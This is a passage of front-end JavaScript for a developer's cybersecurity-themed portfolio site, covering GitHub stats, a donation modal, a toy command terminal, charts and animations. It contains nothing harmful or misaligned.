  const openBtn = e.target.closest(".case-open");
  if (openBtn) { openCase(openBtn.dataset.case); return; }
  if (e.target.closest("[data-close-case]")) closeCase();
});
document.addEventListener("keydown", e => { if (e.key === "Escape") closeCase(); });
window.addEventListener("popstate", () => {
  if (location.hash.indexOf("#case-") === 0) openCase(location.hash.replace("#case-", ""), false);
  else closeCase(true);
});
if (location.hash.indexOf("#case-") === 0) {
  const id = location.hash.replace("#case-", "");
  if (CASE_STUDIES[id]) setTimeout(() => openCase(id, false), 400);
}

// ---- Print resume ----
const printResumeBtn = document.getElementById("printResumeBtn");
if (printResumeBtn) printResumeBtn.addEventListener("click", () => window.print());

// ============================================================
//  LIVE GITHUB DATA (feeds the fallback cards)
// ============================================================
(function initGithubCards() {
  const USER = "NejamulHaque";
  const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
  const LANG_COLORS = {
    Python: "#3572A5", JavaScript: "#f1e05a", HTML: "#e34c26", CSS: "#663399",
    TypeScript: "#3178c6", Shell: "#89e051", Bash: "#89e051", Java: "#b07219",
    C: "#555555", "C++": "#f34b7d", Dockerfile: "#384d54", SCSS: "#c6538c", Kotlin: "#00e5ff"
  };
  async function load() {
    const userRes = await fetch(`https://api.github.com/users/${USER}`);
    if (!userRes.ok) throw new Error("user fetch failed");
    const user = await userRes.json();
    set("ghRepos", user.public_repos ?? "—");
    set("ghFollowers", user.followers ?? "—");
    set("ghYears", Math.max(1, new Date().getFullYear() - new Date(user.created_at).getFullYear()));

    const reposRes = await fetch(`https://api.github.com/users/${USER}/repos?per_page=100&sort=updated`);
    const repos = await reposRes.json();
    if (!Array.isArray(repos)) throw new Error("repos fetch failed");
    set("ghStars", repos.reduce((s, r) => s + (r.stargazers_count || 0), 0));

    const bytes = {};
    repos.forEach(r => { if (r.language) bytes[r.language] = (bytes[r.language] || 0) + (r.size || 1); });
    const total = Object.values(bytes).reduce((a, b) => a + b, 0);
    const top = Object.entries(bytes).sort((a, b) => b[1] - a[1]).slice(0, 5);
    const wrap = document.getElementById("ghLangs");
    if (!wrap || !total || !top.length) { if (wrap) wrap.innerHTML = '<div class="gh-loading">No language data yet.</div>'; return; }
    wrap.innerHTML = top.map(([lang, b]) => {
      const pct = Math.max(2, Math.round((b / total) * 100));
      const color = LANG_COLORS[lang] || "#00D9FF";
      return `<div class="gh-lang-row">
        <div class="gh-lang-top"><span><i style="background:${color}"></i>${lang}</span><span>${pct}%</span></div>
        <div class="gh-lang-bar"><span style="width:0%;background:${color}" data-w="${pct}%"></span></div>
      </div>`;
    }).join("");
    requestAnimationFrame(() => requestAnimationFrame(() => {
      wrap.querySelectorAll(".gh-lang-bar span").forEach(s => { s.style.width = s.dataset.w; });
    }));
  }
  load().catch(() => {
    const wrap = document.getElementById("ghLangs");
    if (wrap) wrap.innerHTML = '<div class="gh-loading">Live stats temporarily unavailable — full activity on GitHub.</div>';
  });
})();

// ============================================================
//  GITHUB TILES — images first, automatic live fallbacks
// ============================================================
(function initGithubTiles() {
  const swap = (hideId, showId) => {
    const hide = document.getElementById(hideId);
    const show = document.getElementById(showId);
    if (hide) hide.classList.add("gh-hidden");
    if (show) show.classList.remove("gh-hidden");
  };

  const statsImg = document.getElementById("ghStatsImg");
  if (statsImg) statsImg.addEventListener("error", () => swap("ghStatsImg", "ghStatsCard"));
  const langsImg = document.getElementById("ghLangsImg");
  if (langsImg) langsImg.addEventListener("error", () => swap("ghLangsImg", "ghLangCard"));

  const streakImg = document.getElementById("ghStreakImg");
  const streakAlt = document.getElementById("ghStreakAlt");
  if (streakImg) streakImg.addEventListener("error", () => {
    streakImg.classList.add("gh-hidden");
    if (streakAlt) {
      streakAlt.classList.remove("gh-hidden");
      streakAlt.src = streakAlt.dataset.src;
      streakAlt.addEventListener("error", () => swap("ghStreakAlt", "ghStreakCard"), { once: true });
    } else {
      swap("ghStreakImg", "ghStreakCard");
    }
  });

  // Activity graph returns an error-SVG (sad face) that "loads" fine,
  // so health-check it via fetch and swap to the live heatmap when bad.
  const graph = document.getElementById("ghGraph");
  const showHeat = () => swap("ghGraph", "ghHeatCard");
  if (graph) {
    fetch(graph.src).then(r => r.text()).then(text => {
      if (/Failed to retrieve/i.test(text)) showHeat();
    }).catch(showHeat);
  } else {
    showHeat();
  }

  const snake = document.getElementById("ghSnake");
  if (snake) snake.addEventListener("error", () => {
    const holder = snake.closest(".github-snake");
    if (holder) holder.classList.add("gh-hidden");
  });
})();

// ============================================================
//  LIVE CONTRIBUTION HEATMAP — GitHub Events API (90 days)
// ============================================================
(function initHeatmap() {
  const USER = "NejamulHaque";
  const wrap = document.getElementById("ghHeat");
  if (!wrap) return;
  async function load() {
    const res = await fetch(`https://api.github.com/users/${USER}/events/public?per_page=100`);
    if (!res.ok) throw new Error("events fetch failed");
    const events = await res.json();
    if (!Array.isArray(events)) throw new Error("bad payload");
    const perDay = {};
    events.forEach(ev => {
      const day = (ev.created_at || "").slice(0, 10);
      if (!day) return;
      const n = ev.type === "PushEvent" ? ((ev.payload && ev.payload.commits && ev.payload.commits.length) || 1) : 1;
      perDay[day] = (perDay[day] || 0) + n;
    });
    const total = Object.values(perDay).reduce((a, b) => a + b, 0);
    const totalEl = document.getElementById("ghHeatTotal");
    if (totalEl) totalEl.textContent = `${total} public contributions · last 90 days`;
    const DAYS = 91;
    const today = new Date();
    const cells = [];
    for (let i = DAYS - 1; i >= 0; i--) {
      const d = new Date(today);
      d.setDate(today.getDate() - i);
      const key = d.toISOString().slice(0, 10);
      const c = perDay[key] || 0;
      const lvl = c === 0 ? 0 : c === 1 ? 1 : c <= 3 ? 2 : c <= 6 ? 3 : 4;
      cells.push(`<i class="l${lvl}" title="${key} — ${c} contribution${c === 1 ? "" : "s"}"></i>`);
    }
    wrap.innerHTML = cells.join("");
  }
  load().catch(() => {
    wrap.innerHTML = '<div class="gh-loading">Activity map temporarily unavailable — recent pushes are visible on your GitHub profile.</div>';
  });
})();

// ============================================================
//  SUPPORT / DONATE MODAL
// ============================================================
(function initSupport() {
  const fab = document.getElementById("supportFab");
  const modal = document.getElementById("supportModal");
  const toast = document.getElementById("copyToast");
  const copyBtn = document.getElementById("copyUpiBtn");
  const upiIdEl = document.getElementById("upiIdText");
  const upiPayLink = document.getElementById("upiPayLink");
  const amountChips = document.querySelectorAll(".amount-chip");
  const qrImg = document.getElementById("upiQrImg");

  if (!modal) return;

  const UPI_ID = "nejamulhaque@upi";
  const UPI_NAME = "Nejamul Haque";
  let currentAmount = 100;

  function buildUpiUrl(amount) {
    const note = encodeURIComponent("Thanks for the coffee ☕");
    return `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent(UPI_NAME)}&cu=INR&am=${amount}&tn=${note}`;
  }

  function buildQrUrl(amount) {
    const data = encodeURIComponent(buildUpiUrl(amount));
    return `https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=2&bgcolor=ffffff&color=050810&qzone=2&data=${data}`;
  }

  function updateAmount(amount) {
    currentAmount = amount;
    upiPayLink.href = buildUpiUrl(amount);
    qrImg.src = buildQrUrl(amount);
    document.querySelectorAll(".amount-chip").forEach(c =>
      c.classList.toggle("active", Number(c.dataset.amt) === amount)
    );
    document.querySelector(".upi-amount-hint").textContent = `Default: ₹${amount}`;
  }

  // Open / close
  function openSupport() { modal.classList.add("open"); body.classList.add("modal-open"); }
  function closeSupport() { modal.classList.remove("open"); body.classList.remove("modal-open"); }

  fab?.addEventListener("click", openSupport);
  modal.querySelectorAll("[data-close-support]").forEach(el =>
    el.addEventListener("click", closeSupport)
  );
  document.addEventListener("keydown", e => {
    if (e.key === "Escape" && modal.classList.contains("open")) closeSupport();
  });

  // Amount chips
  amountChips.forEach(chip => {
    chip.addEventListener("click", () => updateAmount(Number(chip.dataset.amt)));
  });

  // Copy UPI ID
  copyBtn?.addEventListener("click", async () => {
    try {
      await navigator.clipboard.writeText(UPI_ID);
      copyBtn.classList.add("copied");
      copyBtn.querySelector("i").className = "fa-solid fa-check";
      copyBtn.querySelector("span").textContent = "Copied!";
      toast?.classList.add("show");
      setTimeout(() => {
        copyBtn.classList.remove("copied");
        copyBtn.querySelector("i").className = "fa-regular fa-copy";
        copyBtn.querySelector("span").textContent = "Copy";
        toast?.classList.remove("show");
      }, 2200);
    } catch (err) {
      // Fallback for older browsers
      const range = document.createRange();
      range.selectNode(upiIdEl);
      window.getSelection().removeAllRanges();
      window.getSelection().addRange(range);
      document.execCommand("copy");
      window.getSelection().removeAllRanges();
    }
  });

  // Initialize with default ₹100
  updateAmount(100);
})();

// ============================================================
//  MOBILE DRAWER — hamburger + slide-in nav
// ============================================================
(function initDrawer() {
  const burger = document.getElementById("navBurger");
  const drawer = document.getElementById("mobileDrawer");
  const backdrop = document.getElementById("drawerBackdrop");
  const closeBtn = document.getElementById("drawerClose");
  const drawerNav = document.getElementById("drawerNav");
  if (!burger || !drawer || !drawerNav) return;

  // Clone desktop nav links once (single source of truth)
  if (siteNav) {
    siteNav.querySelectorAll("a").forEach((a, i) => {
      const c = document.createElement("a");
      c.href = a.getAttribute("href");
      c.className = "drawer-link";
      c.style.setProperty("--i", i);
      c.innerHTML = `<span class="drawer-num">${String(i + 1).padStart(2, "0")}</span>${a.textContent}`;
      drawerNav.appendChild(c);
    });
  }

  let open = false;
  function setOpen(v) {
    open = v;
    drawer.classList.toggle("open", v);
    backdrop.classList.toggle("show", v);
    burger.classList.toggle("active", v);
    body.classList.toggle("modal-open", v); // scroll lock
    burger.setAttribute("aria-expanded", String(v));
    drawer.setAttribute("aria-hidden", String(!v));
    if (v) syncActive();
  }

  // Highlight current section when drawer opens
  function syncActive() {
    const href = document.querySelector(".site-nav a.active")?.getAttribute("href");
    drawerNav.querySelectorAll("a").forEach(a =>
      a.classList.toggle("active", a.getAttribute("href") === href)
    );
  }

  burger.addEventListener("click", () => setOpen(!open));
  closeBtn?.addEventListener("click", () => setOpen(false));
  backdrop?.addEventListener("click", () => setOpen(false));

  // Drawer links: smooth scroll + auto close
  drawerNav.addEventListener("click", e => {
    const a = e.target.closest("a[href^='#']");
    if (!a) return;
    e.preventDefault();
    const target = document.querySelector(a.getAttribute("href"));
    setOpen(false);
    if (target) setTimeout(() => target.scrollIntoView({ behavior: "smooth", block: "start" }), 280);
  });

  // Esc closes; resize to desktop closes
  document.addEventListener("keydown", e => { if (e.key === "Escape" && open) setOpen(false); });
  window.addEventListener("resize", () => { if (window.innerWidth > 700 && open) setOpen(false); }, { passive: true });
})();

// ============================================================
//  FEATURE 1: INTERACTIVE COMMAND TERMINAL
// ============================================================
(function initTerminal() {
  const termBody = document.getElementById("termBody");
  const termOutput = document.getElementById("termOutput");
  const termInput = document.getElementById("termInput");
  if (!termBody || !termOutput || !termInput) return;

  const startTime = Date.now();
  let cmdHistory = [];
  let historyIdx = -1;

  termBody.addEventListener("click", () => termInput.focus());

  const printLine = (html) => {
    const div = document.createElement("div");
    div.innerHTML = html;
    termOutput.appendChild(div);
    while (termOutput.children.length > 50) termOutput.removeChild(termOutput.firstChild);
    termBody.scrollTop = termBody.scrollHeight;
  };

  const processCommand = (cmd) => {
    const rawCmd = cmd.trim();
    const parts = rawCmd.split(" ");
    const baseCmd = parts[0].toLowerCase();
    let out = "";

    switch (baseCmd) {
      case "whoami":
        out = `<div class="term-out">nejamul-haque · devsecops-engineer</div>`;
        break;
      case "skills":
        out = `<div class="term-out"><span style="color:var(--accent)">Systems</span> | <span style="color:var(--accent-2)">Defense</span> | <span style="color:var(--accent-3)">Cloud/K8s</span> | <span style="color:var(--accent-warm)">DevSecOps</span></div>`;
        break;
      case "projects":
        if (parts[1] === "--go") {
          out = `<div class="term-out ok">Navigating to projects...</div>`;
          document.getElementById("projects")?.scrollIntoView({ behavior: "smooth" });
        } else {
          out = `<div class="term-out">1. Irus AI  2. Sentinel Daemon  3. Threat Intel Parser<br>4. CollabSheets  5. ProResume  6. Nestfy<br>Type <span style="color:var(--accent)">projects --go</span> to jump there</div>`;
        }
        break;
      case "contact":
        if (parts[1] === "--open") {
          out = `<div class="term-out ok">Opening contact section...</div>`;
          document.getElementById("contact")?.scrollIntoView({ behavior: "smooth" });
        } else {
          out = `<div class="term-out">GitHub: NejamulHaque | LinkedIn: in/NejamulHaque<br>Type <span style="color:var(--accent)">contact --open</span> to message me</div>`;
        }
        break;
      case "help":
        out = `<div class="term-out">Available commands:<br><span style="color:var(--accent)">whoami</span> · <span style="color:var(--accent)">skills</span> · <span style="color:var(--accent)">projects</span> · <span style="color:var(--accent)">contact</span><br><span style="color:var(--accent)">uptime</span> · <span style="color:var(--accent)">cat /etc/security.txt</span> · <span style="color:var(--accent)">matrix</span><br><span style="color:var(--accent)">history</span> · <span style="color:var(--accent)">clear</span> · <span style="color:var(--accent)">sudo</span></div>`;
        break;
      case "clear":
        termOutput.innerHTML = "";
        return;
      case "uptime":
        const diff = Math.floor((Date.now() - startTime) / 1000);
        const m = Math.floor(diff / 60), s = diff % 60;
        out = `<div class="term-out">up ${m} min, ${s} sec</div>`;
        break;
      case "cat":
        if (rawCmd.includes("security.txt")) {
          out = `<div class="term-out ok">"Security is an infrastructure boundary, not a late-stage patch."<br>— Shifting Security Left</div>`;
        } else {
          out = `<div class="term-out">cat: ${parts[1] || ''}: No such file or directory</div>`;
        }
        break;
      case "sudo":
        out = `<div class="term-out" style="color:var(--accent-warm)">Nice try. This terminal runs with least privilege.</div>`;
        break;
      case "matrix":
        termBody.classList.add("term-matrix");
        out = `<div class="term-out term-matrix">Wake up, Neo...</div>`;
        setTimeout(() => termBody.classList.remove("term-matrix"), 3000);
        break;
      case "history":
        out = cmdHistory.map((c, i) => `<div class="term-out" style="color:var(--muted)">${i + 1}  ${c}</div>`).join("");
        break;
      case "":
        break;
      default:
        out = `<div class="term-out">command not found: ${baseCmd}. Type <span style="color:var(--accent)">help</span> for available commands.</div>`;
    }
    if (out) printLine(out);
  };

  termInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      const cmd = termInput.value;
      printLine(`<div class="term-line"><span class="term-prompt">root@sentinel:~$</span> ${cmd}</div>`);
      if (cmd.trim()) { cmdHistory.push(cmd); historyIdx = cmdHistory.length; }
      processCommand(cmd);
      termInput.value = "";
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      if (historyIdx > 0) { historyIdx--; termInput.value = cmdHistory[historyIdx]; }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      if (historyIdx < cmdHistory.length - 1) { historyIdx++; termInput.value = cmdHistory[historyIdx]; }
      else { historyIdx = cmdHistory.length; termInput.value = ""; }
    }
  });
})();

// ============================================================
//  FEATURE 2: KEYBOARD SHORTCUTS OVERLAY
// ============================================================
(function initShortcuts() {
  const overlay = document.getElementById("shortcutsOverlay");
  const closeBtn = document.getElementById("shortcutsClose");
  if (!overlay) return;

  const toggleOverlay = () => {
    const isOpen = overlay.classList.contains("open");
    overlay.classList.toggle("open");
    overlay.setAttribute("aria-hidden", isOpen ? "true" : "false");
    document.body.classList.toggle("modal-open", !isOpen);
  };

  if (closeBtn) closeBtn.addEventListener("click", toggleOverlay);
  overlay.addEventListener("click", (e) => { if (e.target === overlay) toggleOverlay(); });

  const sectionsMap = {
    '1': 'about', '2': 'experience', '3': 'skills', '4': 'timeline',
    '5': 'articles', '6': 'achievements', '7': 'projects',
    '8': 'threatmodel', '9': 'github', '0': 'certificates'
  };

  document.addEventListener("keydown", (e) => {
    const active = document.activeElement;
    const isInput = active && (active.tagName === "INPUT" || active.tagName === "TEXTAREA");
    if (e.key === "Escape" && overlay.classList.contains("open")) { toggleOverlay(); return; }
    if (isInput) return;
    if (e.key === "?") { e.preventDefault(); toggleOverlay(); }
    else if (sectionsMap[e.key]) {
      const target = document.getElementById(sectionsMap[e.key]);
      if (target) { e.preventDefault(); target.scrollIntoView({ behavior: "smooth", block: "start" }); }
      if (overlay.classList.contains("open")) toggleOverlay();
    } else if (e.key === "t" && !e.ctrlKey && !e.metaKey) {
      e.preventDefault(); document.getElementById("themeToggle")?.click();
    } else if (e.key === "p" && !e.ctrlKey && !e.metaKey) {
      e.preventDefault(); window.print();
    } else if (e.key === "/") {
      e.preventDefault();
      const tInput = document.getElementById("termInput");
      if (tInput) { tInput.scrollIntoView({ behavior: "smooth", block: "center" }); setTimeout(() => tInput.focus(), 500); }
    } else if (e.key === "j") { e.preventDefault(); window.scrollBy({ top: 200, behavior: "smooth" }); }
    else if (e.key === "k") { e.preventDefault(); window.scrollBy({ top: -200, behavior: "smooth" }); }
  });
})();

// ============================================================
//  FEATURE 3: ANIMATED SKILL RADAR CHART
// ============================================================
(function initRadarChart() {
  const canvas = document.getElementById('skillsRadar');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

  const skills = [
    { label: "Systems Admin", val: 85 }, { label: "Threat Defense", val: 80 },
    { label: "Cloud & K8s", val: 75 }, { label: "CI/CD & DevSecOps", val: 90 },
    { label: "Digital Forensics", val: 70 }, { label: "Full-Stack Dev", val: 82 }
  ];
  const numAxes = skills.length;
  const dpr = window.devicePixelRatio || 1;
  const size = 400;
  canvas.width = size * dpr; canvas.height = size * dpr;
  ctx.scale(dpr, dpr);
  canvas.style.width = `${size}px`; canvas.style.height = `${size}px`;

  const centerX = size / 2, centerY = size / 2 + 10, radius = 130;
  let animProgress = reduceMotion ? 1 : 0;
  let isAnimating = false, hasAnimated = false, hoveredIndex = -1;
  const getVar = (name) => getComputedStyle(document.body).getPropertyValue(name).trim();

  function draw() {
    ctx.clearRect(0, 0, size, size);
    const accent = getVar('--accent') || '#00e5ff';
    const accent2 = getVar('--accent-2') || '#7b5cfa';
    const mutedCol = getVar('--muted') || '#7a8ab0';
    const fontMain = getVar('--fd') || 'sans-serif';
    const fontMono = getVar('--fm') || 'monospace';

    ctx.lineWidth = 1;
    for (let level = 1; level <= 5; level++) {
      const r = radius * (level / 5);
      ctx.beginPath();
      for (let i = 0; i < numAxes; i++) {
        const angle = (Math.PI * 2 * i) / numAxes - Math.PI / 2;
        const x = centerX + Math.cos(angle) * r, y = centerY + Math.sin(angle) * r;
        i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
      }
      ctx.closePath(); ctx.strokeStyle = 'rgba(255,255,255,0.08)'; ctx.stroke();
    }

    for (let i = 0; i < numAxes; i++) {
      const angle = (Math.PI * 2 * i) / numAxes - Math.PI / 2;
      const x = centerX + Math.cos(angle) * radius, y = centerY + Math.sin(angle) * radius;
      ctx.beginPath(); ctx.moveTo(centerX, centerY); ctx.lineTo(x, y);
      ctx.strokeStyle = 'rgba(255,255,255,0.12)'; ctx.stroke();
      const labelDist = radius + 28;
      const lx = centerX + Math.cos(angle) * labelDist, ly = centerY + Math.sin(angle) * labelDist;
      ctx.fillStyle = (i === hoveredIndex) ? accent : mutedCol;
      ctx.font = `600 12px ${fontMain}`; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
      let tx = lx; if (Math.abs(Math.cos(angle)) > 0.1) tx += Math.cos(angle) * 12;
      ctx.fillText(skills[i].label, tx, ly);
      if (i === hoveredIndex) {
        ctx.fillStyle = accent2; ctx.font = `11px ${fontMono}`;
        ctx.fillText(`${skills[i].val}%`, tx, ly + 16);
      }
    }

    if (animProgress > 0) {
      ctx.beginPath();
      for (let i = 0; i < numAxes; i++) {
        const angle = (Math.PI * 2 * i) / numAxes - Math.PI / 2;
        const val = (skills[i].val / 100) * animProgress;
        const x = centerX + Math.cos(angle) * radius * val, y = centerY + Math.sin(angle) * radius * val;
        i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
      }
      ctx.closePath();
      ctx.fillStyle = 'rgba(0,229,255,0.15)'; ctx.shadowColor = accent; ctx.shadowBlur = 12; ctx.fill();
      ctx.shadowBlur = 0; ctx.lineWidth = 2.5; ctx.strokeStyle = accent2; ctx.stroke();
      for (let i = 0; i < numAxes; i++) {
        const angle = (Math.PI * 2 * i) / numAxes - Math.PI / 2;
        const val = (skills[i].val / 100) * animProgress;
        const x = centerX + Math.cos(angle) * radius * val, y = centerY + Math.sin(angle) * radius * val;
        ctx.beginPath(); ctx.arc(x, y, 4, 0, Math.PI * 2); ctx.fillStyle = accent; ctx.fill();
      }
    }
  }

  function animateRadar() {
    if (!isAnimating) return;
    animProgress += 0.02;
    if (animProgress >= 1) { animProgress = 1; isAnimating = false; }
    draw();
    if (isAnimating) requestAnimationFrame(animateRadar);
  }

  const observer = new IntersectionObserver(entries => {
    if (entries[0].isIntersecting && !hasAnimated) {
      hasAnimated = true;
      if (!reduceMotion) { isAnimating = true; requestAnimationFrame(animateRadar); } else draw();
    }
  }, { threshold: 0.3 });
  observer.observe(canvas);

  canvas.addEventListener('mousemove', (e) => {
    const rect = canvas.getBoundingClientRect();
    const mx = (e.clientX - rect.left) * (size / rect.width), my = (e.clientY - rect.top) * (size / rect.height);
    hoveredIndex = -1;
    for (let i = 0; i < numAxes; i++) {
      const angle = (Math.PI * 2 * i) / numAxes - Math.PI / 2;
      const lx = centerX + Math.cos(angle) * (radius + 28), ly = centerY + Math.sin(angle) * (radius + 28);
      if (Math.sqrt((mx - lx) ** 2 + (my - ly) ** 2) < 35) { hoveredIndex = i; break; }
    }
    draw();
  });
  canvas.addEventListener('mouseleave', () => { hoveredIndex = -1; draw(); });
})();

// ============================================================
//  FEATURE 4: ANIMATED NETWORK TOPOLOGY MAP
// ============================================================
(function initNetworkTopology() {
  const canvas = document.getElementById('threatTopology');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  const dpr = window.devicePixelRatio || 1;
  const cw = 800, ch = 260;
  canvas.width = cw * dpr; canvas.height = ch * dpr;
  ctx.scale(dpr, dpr);
  canvas.style.width = '100%'; canvas.style.maxWidth = `${cw}px`; canvas.style.height = 'auto';

  const getVar = (name) => getComputedStyle(document.body).getPropertyValue(name).trim();
  const nodes = [
    { id: 'attacker', x: 80, y: ch / 2, label: 'Attacker', color: '#ff6b6b', role: 'External Threat / Botnet' },
    { id: 'firewall', x: 240, y: ch / 2, label: 'Firewall', color: '#00e5ff', role: 'Sentinel Daemon (iptables)' },
    { id: 'server', x: 400, y: ch / 2, label: 'Server', color: '#00ff9d', role: 'App Server (Docker/K8s)' },
    { id: 'db', x: 560, y: ch / 2, label: 'Database', color: '#7b5cfa', role: 'PostgreSQL Instance' },
    { id: 'audit', x: 720, y: ch / 2, label: 'Audit Log', color: '#ffbd2e', role: 'SIEM / Log Pipeline' }
  ];
  const paths = [
    { from: 0, to: 1, type: 'attack', packetColor: '#ff6b6b', pulseMult: 1.5 },
    { from: 1, to: 2, type: 'safe', packetColor: '#00ff9d', pulseMult: 1.0 },
    { from: 2, to: 3, type: 'safe', packetColor: '#7b5cfa', pulseMult: 0.8 },
    { from: 2, to: 4, type: 'safe', packetColor: '#ffbd2e', pulseMult: 0.8 }
  ];
  let time = 0, hoveredNode = null, isRunning = false;

  function drawTopology() {
    ctx.clearRect(0, 0, cw, ch);
    if (!reduceMotion) time += 0.02;
    const bgPanel = getVar('--bg-panel') || '#0b1225';
    const textCol = getVar('--text') || '#e8eeff';
    const fontMain = getVar('--fd') || 'sans-serif';
    const fontMono = getVar('--fm') || 'monospace';

    paths.forEach(p => {
      const n1 = nodes[p.from], n2 = nodes[p.to];
      ctx.beginPath(); ctx.moveTo(n1.x, n1.y); ctx.lineTo(n2.x, n2.y);
      ctx.strokeStyle = 'rgba(255,255,255,0.15)'; ctx.lineWidth = 1.5;
      ctx.setLineDash([6, 6]); ctx.lineDashOffset = reduceMotion ? 0 : (-time * 15 * p.pulseMult);
      ctx.stroke(); ctx.setLineDash([]);
      if (!reduceMotion) {
        const progress = (time * 0.4 * p.pulseMult + p.from * 0.3) % 1;
        const px = n1.x + (n2.x - n1.x) * progress, py = n1.y + (n2.y - n1.y) * progress;
        ctx.beginPath(); ctx.arc(px, py, 4, 0, Math.PI * 2);
        ctx.fillStyle = p.packetColor; ctx.shadowBlur = 10; ctx.shadowColor = p.packetColor;
        ctx.fill(); ctx.shadowBlur = 0;
      }
    });

    nodes.forEach(n => {
      if (!reduceMotion) {
        const pulse = Math.sin(time * 3 + n.x) * 0.5 + 0.5;
        ctx.beginPath(); ctx.arc(n.x, n.y, 25 + pulse * 6, 0, Math.PI * 2);
        ctx.fillStyle = n.color; ctx.globalAlpha = 0.12; ctx.fill(); ctx.globalAlpha = 1.0;
      }
      ctx.beginPath(); ctx.arc(n.x, n.y, 18, 0, Math.PI * 2);
      ctx.fillStyle = bgPanel; ctx.fill(); ctx.lineWidth = 2; ctx.strokeStyle = n.color; ctx.stroke();
      ctx.beginPath(); ctx.arc(n.x, n.y, 6, 0, Math.PI * 2); ctx.fillStyle = n.color; ctx.fill();
      ctx.fillStyle = textCol; ctx.font = `600 13px ${fontMain}`;
      ctx.textAlign = 'center'; ctx.textBaseline = 'top'; ctx.fillText(n.label, n.x, n.y + 35);
    });

    if (hoveredNode) {
      ctx.fillStyle = bgPanel; ctx.strokeStyle = hoveredNode.color; ctx.lineWidth = 1;
      const tw = 180, th = 36;
      let tx = hoveredNode.x - tw / 2, ty = hoveredNode.y - 45 - th;
      if (tx < 5) tx = 5; if (tx + tw > cw - 5) tx = cw - tw - 5;
      ctx.beginPath(); ctx.roundRect(tx, ty, tw, th, 6); ctx.fill(); ctx.stroke();
      ctx.fillStyle = textCol; ctx.font = `500 11px ${fontMono}`;
      ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
      ctx.fillText(hoveredNode.role, tx + tw / 2, ty + th / 2);
    }
    if (isRunning) requestAnimationFrame(drawTopology);
  }

  canvas.addEventListener('mousemove', e => {
    const rect = canvas.getBoundingClientRect();
    const mx = (e.clientX - rect.left) * (cw / rect.width), my = (e.clientY - rect.top) * (ch / rect.height);
    hoveredNode = null;
    nodes.forEach(n => { if (Math.sqrt((mx - n.x) ** 2 + (my - n.y) ** 2) < 30) hoveredNode = n; });
    if (reduceMotion && !isRunning) drawTopology();
  });
  canvas.addEventListener('mouseleave', () => { hoveredNode = null; if (reduceMotion && !isRunning) drawTopology(); });

  const observer = new IntersectionObserver(entries => {
    if (entries[0].isIntersecting) { isRunning = true; requestAnimationFrame(drawTopology); }
    else isRunning = false;
  }, { threshold: 0.1 });
  observer.observe(canvas);
})();

// ============================================================
//  FEATURE 5: KONAMI CODE → SECURITY AUDIT MODE
// ============================================================
(function initKonami() {
  const konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
  let konamiIndex = 0;
  const auditCloseBtn = document.getElementById('auditClose');

  function populateAuditData() {
    const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    document.getElementById('auditCsp').textContent = cspMeta ? 'Enforced (Meta)' : 'Missing';
    document.getElementById('auditHttps').textContent = location.protocol === 'https:' ? 'Secure (TLS)' : 'Insecure (HTTP)';
    const refMeta = document.querySelector('meta[name="referrer"]');
    document.getElementById('auditRef').textContent = refMeta ? refMeta.content : 'None';
    const resources = performance.getEntriesByType('resource');
    document.getElementById('auditExtRes').textContent = resources.filter(r => !r.name.includes(location.hostname)).length;
    document.getElementById('auditInline').textContent = Array.from(document.querySelectorAll('script')).filter(s => !s.src).length;
    document.getElementById('auditDom').textContent = document.getElementsByTagName('*').length;
  }

  function appendShields() {
    document.querySelectorAll('a').forEach(a => {
      if (a.hostname && a.hostname !== location.hostname && !a.querySelector('.audit-badge-icon')) {
        const shield = document.createElement('i');
        shield.className = 'fa-solid fa-shield-halved audit-badge-icon';
        shield.title = 'External Link';
        a.appendChild(shield);
      }
    });
  }

  function removeShields() { document.querySelectorAll('.audit-badge-icon').forEach(el => el.remove()); }

  function toggleAuditMode() {
    const isAudit = document.body.classList.toggle('audit-mode');
    if (isAudit) { populateAuditData(); appendShields(); } else removeShields();
  }

  document.addEventListener('keydown', (e) => {
    if (e.key === konamiCode[konamiIndex] || e.key.toLowerCase() === konamiCode[konamiIndex].toLowerCase()) {
      konamiIndex++;
      if (konamiIndex === konamiCode.length) { toggleAuditMode(); konamiIndex = 0; }
    } else konamiIndex = 0;
  });

  if (auditCloseBtn) auditCloseBtn.addEventListener('click', () => { document.body.classList.remove('audit-mode'); removeShields(); });
})();

// ============================================================
//  FEATURE 6: DYNAMIC THEME COLOR SYSTEM
// ============================================================
(function initPalette() {
  const toggleBtn = document.getElementById('paletteToggle');
  const dropdown = document.getElementById('paletteDropdown');
  const options = document.querySelectorAll('.palette-option');
  if (!toggleBtn || !dropdown) return;

  const PALETTE_KEY = 'portfolio-palette';
  const savedPalette = localStorage.getItem(PALETTE_KEY) || 'cyber';

  function applyPalette(palette) {
    document.body.classList.forEach(cls => { if (cls.startsWith('palette-')) document.body.classList.remove(cls); });
    if (palette !== 'cyber') document.body.classList.add(`palette-${palette}`);
    options.forEach(opt => opt.classList.toggle('active', opt.dataset.palette === palette));
    localStorage.setItem(PALETTE_KEY, palette);
  }

  applyPalette(savedPalette);
  toggleBtn.addEventListener('click', (e) => { e.stopPropagation(); dropdown.classList.toggle('show'); });
  options.forEach(opt => {
    opt.addEventListener('click', (e) => { e.stopPropagation(); applyPalette(opt.dataset.palette); dropdown.classList.remove('show'); });
  });
  document.addEventListener('click', (e) => { if (!dropdown.contains(e.target)) dropdown.classList.remove('show'); });
})();

// ============================================================
//  FEATURE 7: VISITOR ANALYTICS DASHBOARD
// ============================================================
(function initAnalytics() {
  const toggleBtn = document.getElementById('analyticsToggle');
  const panel = document.getElementById('analyticsPanel');
  if (!toggleBtn || !panel) return;
  let hasCalculated = false;

  function calculateAnalytics() {
